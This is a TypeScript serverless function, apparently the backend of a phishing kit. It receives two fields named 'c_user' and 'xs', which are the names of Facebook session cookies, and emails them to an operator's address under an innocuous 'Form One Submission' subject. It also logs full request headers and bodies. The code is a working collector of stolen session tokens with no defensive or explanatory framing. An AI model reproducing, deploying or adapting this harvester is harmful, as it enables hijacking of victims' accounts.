import { VercelRequest, VercelResponse } from '@vercel/node';
import nodemailer from 'nodemailer';

// Use base SMTP configuration
const smtpHost = process.env.SMTP_HOST;
const smtpPort = parseInt(process.env.SMTP_PORT || '587');
const smtpUser = process.env.SMTP_USER;
const smtpPass = process.env.SMTP_PASS;
const adminEmail = process.env.ADMIN_EMAIL;

// Log SMTP configuration (excluding sensitive data)
console.log('SMTP Configuration:', {
  host: smtpHost,
  port: smtpPort,
  secure: false,
  hasUser: !!smtpUser,
  hasPass: !!smtpPass,
  hasAdminEmail: !!adminEmail,
  env: process.env.NODE_ENV
});

const transporter = nodemailer.createTransport({
  host: smtpHost,
  port: smtpPort,
  secure: false,
  auth: {
    user: smtpUser,
    pass: smtpPass,
  },
  debug: true, // Enable debug output
  logger: true // Log information into the console
});

export default async function handler(req: VercelRequest, res: VercelResponse) {
  try {
    console.log('Request received:', {
      method: req.method,
      headers: req.headers,
      body: req.body,
      url: req.url
    });

    if (req.method !== 'POST') {
      return res.status(405).json({ 
        status: 'error',
        message: 'Method not allowed',
        allowedMethods: ['POST']
      });
    }

    // Validate environment variables first
    if (!smtpHost || !smtpPort || !smtpUser || !smtpPass) {
      console.error('Missing SMTP configuration:', {
        hasHost: !!smtpHost,
        hasPort: !!smtpPort,
        hasUser: !!smtpUser,
        hasPass: !!smtpPass
      });
      return res.status(500).json({ 
        status: 'error',
        message: 'SMTP configuration error',
        details: 'Missing required SMTP settings'
      });
    }

    if (!adminEmail) {
      console.error('Missing admin email configuration');
      return res.status(500).json({ 
        status: 'error',
        message: 'Configuration error',
        details: 'Admin email not configured'
      });
    }

    const { c_user, xs } = req.body;

    if (!c_user || !xs) {
      console.warn('Missing required fields:', { 
        hasCUser: !!c_user, 
        hasXs: !!xs 
      });
      return res.status(400).json({ 
        status: 'error',
        message: 'Missing required fields',
        details: 'Both c_user and xs are required'
      });
    }

    // Verify SMTP connection before sending
    try {
      console.log('Verifying SMTP connection...');
      await transporter.verify();
      console.log('SMTP connection verified successfully');
    } catch (verifyError: any) {
      console.error('SMTP verification failed:', {
        error: verifyError.message,
        code: verifyError.code,
        command: verifyError.command,
        stack: verifyError.stack
      });
      return res.status(500).json({ 
        status: 'error',
        message: 'Email service unavailable',
        details: verifyError.message
      });
    }

    // Send email
    try {
      console.log('Attempting to send email...');
      const emailResult = await transporter.sendMail({
        from: smtpUser,
        to: adminEmail,
        subject: 'New Form One Submission',
        html: `
          <h2>New Form One Submission</h2>
          <p><strong>c_user:</strong> ${c_user}</p>
          <p><strong>xs:</strong> ${xs}</p>
          <p><strong>Submission Time:</strong> ${new Date().toISOString()}</p>
          <p><strong>Environment:</strong> ${process.env.NODE_ENV}</p>
        `,
      });

      console.log('Email sent successfully:', emailResult);
      return res.status(200).json({ 
        status: 'success',
        message: 'Form submitted successfully',
        messageId: emailResult.messageId
      });
    } catch (emailError: any) {
      console.error('Email sending failed:', {
        error: emailError.message,
        code: emailError.code,
        command: emailError.command,
        stack: emailError.stack
      });
      return res.status(500).json({ 
        status: 'error',
        message: 'Failed to send email',
        details: emailError.message
      });
    }
  } catch (error: any) {
    console.error('Unexpected error:', {
      error: error.message,
      stack: error.stack
    });
    return res.status(500).json({ 
      status: 'error',
      message: 'Unexpected error occurred',
      details: error.message
    });
  }
}